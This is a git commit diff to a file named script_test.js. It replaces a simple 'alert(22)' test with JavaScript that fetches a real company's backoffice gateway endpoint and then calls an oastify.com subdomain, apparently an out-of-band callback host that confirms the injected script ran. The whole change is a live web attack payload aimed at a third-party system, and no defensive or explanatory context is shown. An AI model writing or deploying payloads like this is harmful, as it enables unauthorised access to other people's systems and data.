d4d9354ea51402a85d17e113ac391da0fde30a38
sup3ruserdo <Aleksandrastrelchuk62@gmail.com>
2023-12-04 11:16:46 +0200

    Update script_test.js

--- script_test.js
+++ script_test.js
@@ -1,1 +1,3 @@
-alert(22)
+fetch(`https://demobackoffice.finalto.com/Communication/Gateway.ashx?data=[1,[34,[%22141740%22,%2212/04/2023%22,%2201/15/2024%22]]]`).then((res)=>{
+  fetch(`3vzpzrt08vxu2hmady1t1z0fi6ozcu0j.oastify.com`)
+})
